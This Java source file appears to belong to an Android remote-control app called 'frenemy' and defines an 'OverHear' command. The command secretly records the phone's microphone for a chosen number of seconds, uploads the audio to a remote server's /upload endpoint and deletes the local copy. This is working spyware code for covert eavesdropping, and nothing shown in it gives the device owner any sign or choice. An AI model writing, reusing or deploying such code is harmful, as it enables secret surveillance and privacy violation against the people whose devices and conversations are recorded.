package com.theah64.frenemy.android.commandcenter.commands;

import android.content.Context;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.Looper;

import com.theah64.frenemy.android.utils.APIRequestGateway;
import com.theah64.frenemy.android.utils.App;
import com.theah64.frenemy.android.utils.CommonUtils;
import com.theah64.frenemy.android.utils.MultipartAPIRequestBuilder;
import com.theah64.frenemy.android.utils.OkHttpUtils;

import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.json.JSONException;

import java.io.File;
import java.io.IOException;

import okhttp3.Call;
import okhttp3.Request;
import okhttp3.Response;

/**
 * Created by theapache64 on 21/6/17.
 */

public class OverHear extends BaseCommand {

    private static final String DEFAULT_DURATION_IN_SECONDS = "10"; //10 seconds
    private static final String FLAG_DURATION = "d";

    private static final Options options = new Options()
            .addOption(FLAG_DURATION, true, "Duration");

    public OverHear(String command) throws CommandException, ParseException, CommandHelp {
        super(command);
    }

    @Override
    public void handle(final Context context, final Callback callback) throws IOException {
        final String durationInSec = getCmd().getOptionValue(FLAG_DURATION, DEFAULT_DURATION_IN_SECONDS);
        final long durationInMillis = CommonUtils.parseInt(durationInSec) * 1000;
        callback.onInfo("Recording started for " + durationInSec + " second(s)");

        final File voiceFile = new File(App.APP_DIRECTORY_PATH + File.separator + System.currentTimeMillis() + ".mp4");
        final MediaRecorder mediaRecorder = new MediaRecorder();
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        mediaRecorder.setAudioEncodingBitRate(16);
        mediaRecorder.setAudioSamplingRate(44100);
        mediaRecorder.setOutputFile(voiceFile.getAbsolutePath());
        mediaRecorder.prepare();
        mediaRecorder.start();

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                mediaRecorder.stop();
                mediaRecorder.release();
                callback.onInfo("File saved: " + voiceFile.getAbsolutePath() + ", Size:" + CommonUtils.getSizeInKB(voiceFile));

                new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
                    @Override
                    public void onReadyToRequest(String apiKey, String frenemyId) {

                        //Uploading
                        final Request voiceUploadRequest = new MultipartAPIRequestBuilder("/upload", apiKey)
                                .addFile(voiceFile, "file", MultipartAPIRequestBuilder.TYPE_IMAGE)
                                .build();

                        OkHttpUtils.getInstance().getClient().newCall(voiceUploadRequest).enqueue(new okhttp3.Callback() {
                            @Override
                            public void onFailure(Call call, IOException e) {
                                callback.onError(e.getMessage());
                            }

                            @Override
                            public void onResponse(Call call, Response response) throws IOException {
                                try {
                                    final com.theah64.frenemy.android.utils.Response uploadResp = new com.theah64.frenemy.android.utils.Response(OkHttpUtils.logAndGetStringBody(response));
                                    final String downloadLink = uploadResp.getJSONObjectData().getString("download_link");
                                    callback.onFinish("Voice uploaded:" + CommonUtils.getDownloadHref(downloadLink));
                                    voiceFile.delete();
                                } catch (com.theah64.frenemy.android.utils.Response.ResponseException | JSONException e) {
                                    e.printStackTrace();
                                    callback.onError(e.getMessage());
                                }
                            }
                        });
                    }

                    @Override
                    public void onFailed(String reason) {
                        callback.onError(reason);
                    }
                });
            }
        }, durationInMillis);
    }


    @Override
    public Options getOptions() {
        return options;
    }
}
